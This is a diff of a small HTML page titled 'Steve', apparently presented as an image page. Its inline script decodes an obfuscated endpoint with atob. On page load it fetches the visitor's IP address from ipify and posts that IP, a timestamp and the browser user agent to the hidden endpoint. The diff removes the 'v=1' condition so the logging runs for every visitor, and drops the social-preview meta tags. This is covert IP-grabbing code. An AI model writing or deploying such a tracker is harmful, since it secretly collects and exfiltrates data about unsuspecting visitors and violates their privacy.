@@ -3,12 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <title>Steve</title>
-    <meta property="og:title" content="Steve">
-    <meta property="og:type" content="website">
-    <meta property="og:image" content="https://twojanazwa.github.io/steve.jpg">
-    <meta property="og:description" content="Steve Image">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content="https://twojanazwa.github.io/steve.jpg">
 </head>
 <body>
     <script>
@@ -17,29 +11,26 @@
         const WAMDD = atob(MMMA);
 
         async function sendVisitorData() {
-            const url = window.location.href;
-            if (url.includes('v=1')) {
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    const userIP = ipData.ip;
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
 
-                    const payload = {
-                        content: `New user! \n**IP:** ${userIP} \n**Data:** ${new Date().toLocaleString()} \n**WebBrowser:** ${navigator.userAgent}`
-                    };
+                const payload = {
+                    content: `New user! \n**IP:** ${userIP} \n**Data:** ${new Date().toLocaleString()} \n**WebBrowser:** ${navigator.userAgent}`
+                };
 
-                    await fetch(WAMDD, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(payload)
-                    });
+                await fetch(WAMDD, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
 
-                    console.log('Sended.');
-                } catch (error) {
-                    console.error('Error:', error);
-                }
+                console.log('Sended.');
+            } catch (error) {
+                console.error('Error:', error);
             }
         }
 
